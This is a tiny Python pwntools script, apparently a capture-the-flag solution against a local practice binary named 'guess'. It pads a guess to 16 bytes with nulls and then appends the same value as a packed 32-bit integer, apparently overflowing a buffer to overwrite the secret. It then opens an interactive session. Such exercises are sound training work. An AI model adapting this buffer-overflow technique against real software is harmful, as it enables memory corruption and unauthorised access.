#!/usr/bin/env python3

from pwn import *

r = process('guess');

r.recvuntil('number: ');

myguess = 1234;
r.sendline(str(myguess).encode('ascii').ljust(16, b'\0') + p32(myguess));

r.interactive();
